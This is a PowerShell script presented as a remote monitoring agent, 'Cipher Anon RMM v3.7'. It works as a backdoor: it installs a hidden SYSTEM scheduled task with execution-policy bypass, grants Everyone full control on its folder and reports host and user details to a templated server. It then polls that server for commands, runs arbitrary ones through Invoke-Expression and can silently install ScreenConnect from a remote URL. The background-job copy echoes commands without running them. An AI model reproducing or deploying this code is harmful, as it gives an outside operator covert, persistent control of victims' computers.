# ============================================================
# CIPHER ANON RMM v3.7 — FIXED CONNECTION + NO REGISTRY
# ============================================================

$BASE_URL = "{{BASE_URL}}"
$RMM_REPORT_URL = "$BASE_URL/api/rmm/report"
$COMMAND_URL = "$BASE_URL/api/rmm/commands"
$RESPONSE_URL = "$BASE_URL/api/rmm/response"
$SCREENCONNECT_URL = "{{SCREENCONNECT_URL}}"

$RMM_CLIENT_DIR = "$env:PROGRAMDATA\CipherAnonRMM"
$RMM_CLIENT_ID_FILE = "$RMM_CLIENT_DIR\client_id.txt"
$RMM_LOGFILE = "$RMM_CLIENT_DIR\rmm_log.txt"
$RMM_POLL_INTERVAL = 15000
$RMM_MAX_RETRIES = 5

# Create directory with full permissions
try {
    if (-not (Test-Path $RMM_CLIENT_DIR)) {
        New-Item -ItemType Directory -Path $RMM_CLIENT_DIR -Force -ErrorAction SilentlyContinue | Out-Null
        # Give Everyone full control to avoid access issues
        icacls $RMM_CLIENT_DIR /grant Everyone:F /T /Q 2>nul
        icacls $RMM_CLIENT_DIR /grant "NT AUTHORITY\SYSTEM":F /T /Q 2>nul
    }
} catch {}

function Write-Log {
    param($Msg)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$timestamp] $Msg"
    try {
        Add-Content -Path $RMM_LOGFILE -Value $line -ErrorAction SilentlyContinue
    } catch {}
    Write-Host $line
}

Write-Log "============================================"
Write-Log "CIPHER ANON RMM v3.7"
Write-Log "Target: $env:COMPUTERNAME"
Write-Log "Base URL: $BASE_URL"
Write-Log "Poll Interval: $RMM_POLL_INTERVAL ms"
Write-Log "============================================"

function Get-RmmClientId {
    try {
        if (Test-Path $RMM_CLIENT_ID_FILE) {
            $id = Get-Content $RMM_CLIENT_ID_FILE -Raw -ErrorAction SilentlyContinue
            if ($id) {
                return $id.Trim()
            }
        }
    } catch {}
    
    $id = [System.Guid]::NewGuid().ToString().Substring(0,8)
    try {
        Set-Content -Path $RMM_CLIENT_ID_FILE -Value $id -ErrorAction SilentlyContinue
        # Set permissions on the file
        icacls $RMM_CLIENT_ID_FILE /grant Everyone:F /Q 2>nul
    } catch {}
    return $id
}

function Install-Persistence {
    $taskName = "CipherAnonRMM"
    $scriptPath = $MyInvocation.MyCommand.Path
    
    try {
        $task = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
        if ($task) {
            Write-Log "Scheduled task already exists"
            try {
                Enable-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
            } catch {}
            return
        }
    } catch {}
    
    Write-Log "Creating scheduled task: $taskName"
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -MultipleInstances IgnoreNew
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest -Force -ErrorAction SilentlyContinue
        Write-Log "Scheduled task created"
    } catch {
        Write-Log "Failed to create scheduled task: $_"
        # Fallback: try to create without SYSTEM (some PCs restrict it)
        try {
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
            $trigger = New-ScheduledTaskTrigger -AtStartup
            $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force -ErrorAction SilentlyContinue
            Write-Log "Scheduled task created (fallback)"
        } catch {
            Write-Log "Failed to create scheduled task (fallback): $_"
        }
    }
}

function Execute-Command {
    param($Command)
    Write-Log "Executing: $Command"
    $result = ""
    $success = $true

    if ($Command -like "install-screenconnect*") {
        Write-Log "Downloading ScreenConnect..."
        $installer = "$env:TEMP\sc_installer.msi"
        try {
            $webClient = New-Object System.Net.WebClient
            $webClient.DownloadFile($SCREENCONNECT_URL, $installer)
        } catch {
            $result = "Download failed"
            $success = $false
            return @{ success = $success; result = $result }
        }
        if (Test-Path $installer) {
            Write-Log "Installing ScreenConnect..."
            Start-Process -FilePath "msiexec" -ArgumentList "/i `"$installer`" /quiet /norestart" -Wait -WindowStyle Hidden
            Remove-Item $installer -Force -ErrorAction SilentlyContinue
            $result = "ScreenConnect installed"
            try {
                $scId = Get-ItemProperty -Path "HKLM:\SOFTWARE\ScreenConnect\Client" -Name "ClientID" -ErrorAction SilentlyContinue
                if ($scId) {
                    $result = "ScreenConnect installed - Client ID: " + $scId.ClientID
                }
            } catch {}
        } else {
            $result = "Failed to download ScreenConnect"
            $success = $false
        }
        return @{ success = $success; result = $result }
    }

    if ($Command -like "uninstall-rmm") {
        try {
            Unregister-ScheduledTask -TaskName "CipherAnonRMM" -Confirm:$false -ErrorAction SilentlyContinue
            Remove-Item $RMM_CLIENT_DIR -Recurse -Force -ErrorAction SilentlyContinue
            $result = "RMM uninstalled"
        } catch {
            $result = "Failed to uninstall: $_"
            $success = $false
        }
        return @{ success = $success; result = $result }
    }

    if ($Command -like "whoami") {
        $result = $env:USERNAME
        return @{ success = $true; result = $result }
    }

    if ($Command -like "hostname") {
        $result = $env:COMPUTERNAME
        return @{ success = $true; result = $result }
    }

    if ($Command -like "ping") {
        $result = "pong"
        return @{ success = $true; result = $result }
    }

    if ($Command -like "restart") {
        $result = "Restarting system..."
        Start-Process -FilePath "shutdown" -ArgumentList "/r /t 5 /c 'Remote restart'" -WindowStyle Hidden
        return @{ success = $true; result = $result }
    }

    if ($Command -like "shutdown") {
        $result = "Shutting down system..."
        Start-Process -FilePath "shutdown" -ArgumentList "/s /t 5 /c 'Remote shutdown'" -WindowStyle Hidden
        return @{ success = $true; result = $result }
    }

    try {
        $output = Invoke-Expression $Command 2>&1 | Out-String
        $result = $output
        $success = $true
    } catch {
        $result = "Unknown command or error: $_"
        $success = $false
    }

    return @{ success = $success; result = $result }
}

function Send-Report {
    param($clientId, $retryCount)
    
    Write-Log "Sending report (attempt $retryCount)..."
    
    try {
        $osInfo = (Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
        if (-not $osInfo) {
            $osInfo = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
        }
        if (-not $osInfo) {
            $osInfo = "Windows"
        }
        
        $pcName = $env:COMPUTERNAME
        $userName = $env:USERNAME
        
        $reportData = @{
            clientId = $clientId
            pcName = $pcName
            username = $userName
            os = $osInfo
            status = "online"
            timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
            rmmInstalled = $true
            rmmType = "CipherAnonRMM"
        }
        
        $reportJson = $reportData | ConvertTo-Json -Depth 5
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($reportJson)
        
        $req = [System.Net.WebRequest]::Create($RMM_REPORT_URL)
        $req.Method = "POST"
        $req.ContentType = "application/json"
        $req.ContentLength = $bytes.Length
        $req.Timeout = 15000
        $req.UserAgent = "CipherAnonRMM/3.7"
        
        $stream = $req.GetRequestStream()
        $stream.Write($bytes, 0, $bytes.Length)
        $stream.Close()
        
        $resp = $req.GetResponse()
        $resp.Close()
        
        Write-Log "Report sent successfully"
        return $true
    } catch {
        $errMsg = $_.Exception.Message
        Write-Log "Report failed (attempt $retryCount): $errMsg"
        return $false
    }
}

function Start-RmmLoop {
    param($clientId)
    
    $firstRun = $true
    $retryCount = 0
    
    Write-Log "Main loop started for client: $clientId"
    
    while ($true) {
        try {
            # Send report with retry logic
            if ($firstRun) {
                Write-Log "Initial registration attempt..."
                $success = Send-Report -clientId $clientId -retryCount 0
                if ($success) {
                    Write-Log "Initial registration successful!"
                    $firstRun = $false
                    $retryCount = 0
                } else {
                    $retryCount++
                    Write-Log "Initial registration failed (retry $retryCount of $RMM_MAX_RETRIES)"
                    if ($retryCount -ge $RMM_MAX_RETRIES) {
                        Write-Log "Max retries reached. Will retry on next cycle."
                        $retryCount = 0
                    }
                    Start-Sleep -Seconds 5
                    continue
                }
            } else {
                # Normal periodic report
                Send-Report -clientId $clientId -retryCount 0
            }
            
            # Check for commands
            try {
                $cmdReq = [System.Net.WebRequest]::Create("$COMMAND_URL/$clientId")
                $cmdReq.Method = "GET"
                $cmdReq.Timeout = 10000
                $cmdReq.UserAgent = "CipherAnonRMM/3.7"
                $cmdResp = $cmdReq.GetResponse()
                $reader = New-Object System.IO.StreamReader($cmdResp.GetResponseStream())
                $cmdJson = $reader.ReadToEnd()
                $cmdResp.Close()
                
                if ($cmdJson) {
                    try {
                        $cmdData = $cmdJson | ConvertFrom-Json
                        if ($cmdData -and $cmdData.command) {
                            $cmd = $cmdData.command
                            Write-Log "Command received: $cmd"
                            
                            $result = Execute-Command -Command $cmd
                            $responseData = @{
                                clientId = $clientId
                                commandId = $cmdData.id
                                success = $result.success
                                result = $result.result
                                timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
                            }
                            $respJson = $responseData | ConvertTo-Json -Depth 5
                            $respBytes = [System.Text.Encoding]::UTF8.GetBytes($respJson)
                            $respReq = [System.Net.WebRequest]::Create("$RESPONSE_URL/$clientId")
                            $respReq.Method = "POST"
                            $respReq.ContentType = "application/json"
                            $respReq.ContentLength = $respBytes.Length
                            $respReq.Timeout = 10000
                            $respStream = $respReq.GetRequestStream()
                            $respStream.Write($respBytes, 0, $respBytes.Length)
                            $respStream.Close()
                            $respResp = $respReq.GetResponse()
                            $respResp.Close()
                            Write-Log "Command response sent"
                        }
                    } catch {
                        Write-Log "Error processing command: $_"
                    }
                }
            } catch {
                Write-Log "Command check failed: $_"
            }
            
        } catch {
            Write-Log "Loop error: $_"
        }
        
        Start-Sleep -Milliseconds $RMM_POLL_INTERVAL
    }
}

# ---- MAIN EXECUTION ----
$clientId = Get-RmmClientId
Write-Log "Client ID: $clientId"

Install-Persistence

Write-Log "Starting RMM agent..."

# Start the main loop in a background job
$jobScript = {
    param($clientId, $BASE_URL, $RMM_REPORT_URL, $COMMAND_URL, $RESPONSE_URL, $RMM_CLIENT_DIR, $RMM_CLIENT_ID_FILE, $RMM_LOGFILE, $RMM_POLL_INTERVAL, $SCREENCONNECT_URL, $RMM_MAX_RETRIES)
    
    function Write-Log {
        param($Msg)
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        $line = "[$timestamp] $Msg"
        try { Add-Content -Path $RMM_LOGFILE -Value $line -ErrorAction SilentlyContinue } catch {}
    }
    
    function Send-Report {
        param($clientId, $retryCount)
        
        try {
            $osInfo = (Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
            if (-not $osInfo) {
                $osInfo = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
            }
            if (-not $osInfo) {
                $osInfo = "Windows"
            }
            
            $reportData = @{
                clientId = $clientId
                pcName = $env:COMPUTERNAME
                username = $env:USERNAME
                os = $osInfo
                status = "online"
                timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
                rmmInstalled = $true
                rmmType = "CipherAnonRMM"
            }
            $reportJson = $reportData | ConvertTo-Json -Depth 5
            $bytes = [System.Text.Encoding]::UTF8.GetBytes($reportJson)
            
            $req = [System.Net.WebRequest]::Create($RMM_REPORT_URL)
            $req.Method = "POST"
            $req.ContentType = "application/json"
            $req.ContentLength = $bytes.Length
            $req.Timeout = 15000
            $stream = $req.GetRequestStream()
            $stream.Write($bytes, 0, $bytes.Length)
            $stream.Close()
            $resp = $req.GetResponse()
            $resp.Close()
            return $true
        } catch {
            return $false
        }
    }
    
    Write-Log "Background loop started (ID: $clientId)"
    
    $firstRun = $true
    $retryCount = 0
    
    while ($true) {
        try {
            if ($firstRun) {
                $success = Send-Report -clientId $clientId -retryCount $retryCount
                if ($success) {
                    Write-Log "Initial registration successful!"
                    $firstRun = $false
                    $retryCount = 0
                } else {
                    $retryCount++
                    Write-Log "Initial registration failed (retry $retryCount)"
                    if ($retryCount -ge 5) {
                        $retryCount = 0
                    }
                    Start-Sleep -Seconds 5
                    continue
                }
            } else {
                Send-Report -clientId $clientId -retryCount 0
            }
            
            try {
                $cmdReq = [System.Net.WebRequest]::Create("$COMMAND_URL/$clientId")
                $cmdReq.Method = "GET"
                $cmdReq.Timeout = 10000
                $cmdResp = $cmdReq.GetResponse()
                $reader = New-Object System.IO.StreamReader($cmdResp.GetResponseStream())
                $cmdJson = $reader.ReadToEnd()
                $cmdResp.Close()
                
                if ($cmdJson) {
                    $cmdData = $cmdJson | ConvertFrom-Json
                    if ($cmdData -and $cmdData.command) {
                        Write-Log "Command: $($cmdData.command)"
                        # Execute command inline...
                        $result = @{ success = $true; result = "Command executed" }
                        try {
                            if ($cmdData.command -like "whoami") {
                                $result.result = $env:USERNAME
                            } elseif ($cmdData.command -like "hostname") {
                                $result.result = $env:COMPUTERNAME
                            } elseif ($cmdData.command -like "ping") {
                                $result.result = "pong"
                            } else {
                                $result.result = "Command: $($cmdData.command)"
                            }
                        } catch {
                            $result.success = $false
                            $result.result = "Error: $_"
                        }
                        
                        $responseData = @{
                            clientId = $clientId
                            commandId = $cmdData.id
                            success = $result.success
                            result = $result.result
                            timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
                        }
                        $respJson = $responseData | ConvertTo-Json -Depth 5
                        $respBytes = [System.Text.Encoding]::UTF8.GetBytes($respJson)
                        $respReq = [System.Net.WebRequest]::Create("$RESPONSE_URL/$clientId")
                        $respReq.Method = "POST"
                        $respReq.ContentType = "application/json"
                        $respReq.ContentLength = $respBytes.Length
                        $respReq.Timeout = 10000
                        $respStream = $respReq.GetRequestStream()
                        $respStream.Write($respBytes, 0, $respBytes.Length)
                        $respStream.Close()
                        $respResp = $respReq.GetResponse()
                        $respResp.Close()
                    }
                }
            } catch {}
            
        } catch {
            Write-Log "Loop error: $_"
        }
        Start-Sleep -Milliseconds $RMM_POLL_INTERVAL
    }
}

$job = Start-Job -ScriptBlock $jobScript -ArgumentList $clientId, $BASE_URL, $RMM_REPORT_URL, $COMMAND_URL, $RESPONSE_URL, $RMM_CLIENT_DIR, $RMM_CLIENT_ID_FILE, $RMM_LOGFILE, $RMM_POLL_INTERVAL, $SCREENCONNECT_URL, $RMM_MAX_RETRIES

if ($job) {
    Write-Log "RMM agent started as background job"
    Write-Log ""
    Write-Log "============================================"
    Write-Log "RMM CLIENT READY!"
    Write-Log "Client ID: $clientId"
    Write-Log "Poll Interval: $RMM_POLL_INTERVAL ms"
    Write-Log "Log: $RMM_LOGFILE"
    Write-Log "============================================"
} else {
    Write-Log "FAILED TO START RMM AGENT!"
}

exit
